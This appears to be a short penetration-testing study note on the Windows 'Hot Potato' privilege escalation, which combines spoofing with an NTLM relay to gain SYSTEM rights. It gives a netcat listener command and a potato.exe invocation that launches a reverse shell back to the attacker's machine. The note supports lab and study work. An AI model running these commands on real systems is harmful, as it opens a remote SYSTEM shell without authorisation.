- - -
Hot Potato is the name of an attack that uses a **spoofing attack** along with an **NTLM relay attack** to gain **SYSTEM Privileges**.
This attack tricks windows into authenticating as the SYSTEM user to fake HTTP server using NTLM. The NTLM credentials

Then get relayed to SMB in order to gain command execution.
This vulnerability affects Windows **7**, **8**, **10**, Server 2008, and Server 2012.

Transfer the potato exploit to windows. and the reverse shell also.
then.

```sh
nc -nvlp 9090
```

```cmd
.\potato.exe -ip <our-ip> -cmd “C:\PrivEsc\reverse.exe” -enable_httpserver true -enable_defender true -enable_spoof true -enable_exhaust true
```

- - -

